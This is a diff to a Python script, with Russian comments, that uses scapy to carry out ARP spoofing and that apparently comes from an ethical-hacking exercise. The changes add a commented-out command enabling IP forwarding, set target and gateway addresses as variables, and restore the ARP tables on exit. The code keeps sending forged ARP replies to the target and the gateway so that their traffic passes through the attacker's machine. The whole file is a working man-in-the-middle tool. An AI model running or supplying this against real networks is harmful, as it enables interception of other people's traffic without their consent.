@@ -2,6 +2,8 @@
 import scapy.all as scapy
 import time
 
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)  # создаем объект запроса
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -23,13 +25,17 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)  # отправляем пакет 4 раза, чтобы наверняка
 
+target_ip = '192.168.1.77'
+gateway_ip = '192.168.1.254'
+
 try:
     sent_packets_count = 0
     while True:
-        spoof('10.240.1.144', '10.240.1.1')
-        spoof('10.240.1.1', '10.240.1.144')
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sent_packets_count += 2
         print('\r[+] Packet sent: ' + str(sent_packets_count), end='')
         time.sleep(2)
 except KeyboardInterrupt:
-    print('\n[-] Detected CTRL + C .... Quitting.')
+    print('[-] Detected CTRL + C .... Reseting ARP tables.... Please wait.\n')
+    restore(target_ip, gateway_ip)  # передаем правильный МАС-адрес
